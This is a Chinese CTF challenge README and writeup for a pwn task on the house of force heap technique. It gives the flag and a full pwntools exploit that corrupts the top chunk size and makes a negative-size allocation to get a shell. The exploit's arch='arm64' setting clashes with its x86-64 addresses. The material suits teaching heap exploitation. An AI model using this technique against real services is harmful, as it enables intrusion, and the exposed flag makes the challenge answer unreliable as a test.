* 题目名称：Key
* 出题人：Qanux
* 题目类型：Pwn
* 题目难度：中等偏下
* 考点：house of force
* 描述：libc版本为2.27
* flag:XSCTF{h0u4e_0F_F0r4e_1s_v3rY_ea4y}
* other:release文件夹中的文件才是公布出去的题目  
        ctf_xinetd文件夹是打包好的docker环境
* writeup:  
# KEY
该题为简单的堆利用，用到的技巧为house of force  
有关house of force的原理可以网上搜索
这里只讲述几个需要注意的点：  
我们希望把堆块申请到0x601088这个地址，将这个地址加上0x10的大小的堆头和0x8的read函数的读入偏移后通过read函数写入数据的起始地址为
0x6010a0,这正是key变量所在的地址，我们将/bin/sh\x00写入即可getshell  
```python
top_heap = addr + 0xa0
```
top_heap的地址加0xa0是因为题目中free掉的0x90大小的chunk没有给top chunk所合并，而是进入到tcache中，泄露的地址为free掉的chunk的数据区域的头部(到下一个chunk的距离为0x80)。第二次申请了0x20大小的chunk，两者加起来为(0x80 + 0x20) 0xa0
```python
heap = 0x601088 - top_heap - 0x10
```
这后面-0x10是为了避免堆头部的16字节对偏移的影响  
个人建议：令top chunk移动到target地址所需的size的大小最好通过gdb调试来找(并不是每一次都可以通过单纯的计算得到正确的结果)  
#### 完整exp:  
```python
from pwn import *

p = remote("",)

context(arch='arm64', os='linux', log_level='debug')

def add(size,context):
    p.recvuntil('> ')
    p.sendline(b'1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.send(context)

p.recvuntil('gift :D ')
addr = int(p.recvuntil('\n', drop = True),16)
top_heap = addr + 0xa0 #该地址为执行第一次add后的top chunk地址
success('addr:' + hex(top_heap))
heap = 0x601088 - top_heap - 0x10 
#这个地方如果不-0x10，top chunk的地址会因为heap头的影响+0x10(尽管我们申请的chunk的size为负数，但操作系统中为heap头分配内存计算时为正数，所以我们分配的chunk的最终偏移为负的size+正的0x10)，top chunk的地址变为0x601098

add(0x18,b'a'*0x10 + p64(0xffffffffffffffff))
add(heap,b'bbbb')
add(0x10,b'\x00'*8 + b'/bin/sh\x00')
p.recvuntil('> ')
p.sendline(b'2')

p.interactive()
```



